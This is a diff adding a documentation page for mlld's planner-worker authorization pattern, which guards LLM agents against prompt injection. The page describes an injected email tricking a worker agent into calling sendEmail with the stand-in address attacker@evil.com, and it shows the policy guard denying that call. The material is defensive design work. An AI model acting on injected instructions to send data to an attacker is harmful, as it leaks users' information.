@@ -1,0 +1,181 @@
+---
+id: pattern-planner
+title: Planner-Worker Authorization
+brief: Split agent execution into a planner that authorizes and a worker that executes
+category: patterns
+tags: [patterns, planner, worker, authorization, agents, handles, facts, security]
+related: [facts-and-handles, policy-authorizations, security-getting-started, labels-attestations, security-guards-basics]
+related-code: [interpreter/eval/exec/policy-fragment.ts, interpreter/utils/handle-resolution.ts, interpreter/fyi/facts-runtime.ts]
+updated: 2026-03-25
+---
+
+The planner-worker pattern splits agent execution into two phases: a planner that decides what to do and authorizes specific tools and values, and a worker that executes under those constraints.
+
+## Why split?
+
+An LLM agent that both decides and executes has one shot to get everything right. If it reads untrusted content (an email with injection), the same LLM that's now influenced also controls tool dispatch.
+
+Splitting creates a security boundary:
+
+- The **planner** runs with discovery tools (`@fyi.facts()`), looks up trusted data, and produces an authorization bundle specifying exactly which tools and argument values are allowed
+- The **worker** runs under that authorization, can read untrusted content, but can only call tools the planner pre-approved with pre-approved values
+
+The worker can be tricked into *wanting* to send to `attacker@evil.com`. It can't actually do it because the planner never authorized that recipient.
+
+## Structure
+
+```mlld
+record @contact = {
+  facts: [email: string, name: string],
+  data: [notes: string?]
+}
+
+exe @searchContacts(query) = run cmd {
+  contacts-cli search @query --format json
+} => contact
+
+exe exfil:send @sendEmail(recipient, subject, body) = run cmd {
+  email-cli send --to @recipient --subject @subject --body @body
+} with { controlArgs: ["recipient"] }
+```
+
+The `controlArgs` declaration marks `recipient` as a security-relevant parameter that must be constrained in any authorization.
+
+### Planner phase
+
+The planner looks up contacts, discovers fact candidates, and produces an authorization. The planner LLM has `@fyi.facts` as a tool and calls it via MCP:
+
+```json
+{ "name": "fyi.facts", "arguments": { "query": { "op": "op:named:sendEmail", "arg": "recipient" } } }
+```
+
+The runtime returns candidates with handles. The planner then produces a JSON authorization bundle:
+
+```json
+{
+  "authorizations": {
+    "allow": {
+      "sendEmail": {
+        "args": {
+          "recipient": { "handle": "h_a7x9k2" }
+        }
+      }
+    }
+  }
+}
+```
+
+The handle `h_a7x9k2` refers to the live contact value with `fact:@contact.email` still attached. The planner pins the exact recipient.
+
+### Worker phase
+
+The worker executes under the combined base policy plus planner authorization:
+
+```mlld
+var @base = {
+  defaults: {
+    rules: ["no-send-to-unknown", "no-untrusted-destructive"]
+  },
+  operations: { "exfil:send": ["exfil:send"] }
+}
+
+var @result = @worker(@task) with { policy: @plannerAuth }
+```
+
+At dispatch time:
+
+1. The runtime resolves `{ "handle": "h_a7x9k2" }` back to `"mark@example.com"` with its original `fact:external:@contact.email` label
+2. The authorization guard checks: is `sendEmail` allowed? Is `recipient` the pinned value? Yes
+3. The inherited positive check runs: does `recipient` carry `fact:*.email` or `known`? Yes
+4. The call proceeds
+
+If injection tricks the worker into calling `sendEmail(recipient: "attacker@evil.com")`:
+
+1. `"attacker@evil.com"` is a raw literal -- no handle
+2. The authorization guard checks: does this match the pinned value? No
+3. Call denied
+
+## Key properties
+
+### Control args are mandatory
+
+Declare control args on write executables with `with { controlArgs: [...] }`. If a `tool:w` exe has no `controlArgs` metadata, built-in send/destroy checks fail closed for that operation.
+
+### Inherited positive checks
+
+Authorization alone is not enough. Even with a planner-approved value, inherited positive checks from the base policy still apply:
+
+- `no-send-to-unknown` requires `fact:*.email` or `known` on destination args
+- `no-destroy-unknown` requires `fact:*.id` or `known` on target args
+
+If the planner pins a value that carried `known` or a matching `fact:` label at plan time, the authorization guard carries that proof forward. If the pinned value had no proof, the inherited check still fails.
+
+### Tolerant comparison
+
+The worker can pass *less* than authorized (fewer recipients) but not *more*. Args not mentioned in the constraint are enforced as empty/null, so silent omission never becomes an open hole.
+
+### Locked policies
+
+`locked: true` on the base policy prevents authorization overrides entirely. Use this when you want planner-produced authorizations to be informational rather than permissive.
+
+## Validation
+
+`mlld validate` catches authorization issues before execution:
+
+- Control args not constrained in the authorization
+- Tools authorized with `true` (unconstrained) when they have declared control args
+- Missing control-arg metadata on `tool:w` executables
+
+## Full example
+
+```mlld
+record @contact = {
+  facts: [email: string, name: string],
+  data: [notes: string?],
+  when [
+    internal => :internal
+    * => :external
+  ]
+}
+
+exe @searchContacts(query) = run cmd {
+  contacts-cli search @query --format json
+} => contact
+
+exe exfil:send @sendEmail(recipient, subject, body) = run cmd {
+  email-cli send --to @recipient --subject @subject --body @body
+} with { controlArgs: ["recipient"] }
+
+var @base = {
+  defaults: {
+    rules: ["no-send-to-unknown", "no-untrusted-destructive"]
+  },
+  operations: { "exfil:send": ["exfil:send"] }
+}
+
+>> Step 1: Orchestrator looks up contacts and configures discovery roots
+var @contacts = @searchContacts("Mark")
+var @cfg = { fyi: { facts: [@contacts] } }
+
+>> Step 2: Planner LLM runs with @fyi.facts as a tool
+>> It calls fyi.facts({ query: { op: "op:named:sendEmail", arg: "recipient" } })
+>> and produces an authorization bundle with the discovered handle
+
+>> Step 3: Orchestrator wires planner output into worker policy
+var @plannerAuth = {
+  authorizations: {
+    allow: {
+      sendEmail: {
+        args: {
+          recipient: @contacts.email
+        }
+      }
+    }
+  }
+}
+
+>> Step 4: Worker runs under combined policy
+show @sendEmail(@contacts.email, "Following up", "Hi Mark...") with { policy: @plannerAuth }
+```
+
+See `facts-and-handles` for how records, facts, and handles work. See `policy-authorizations` for the full authorization syntax.
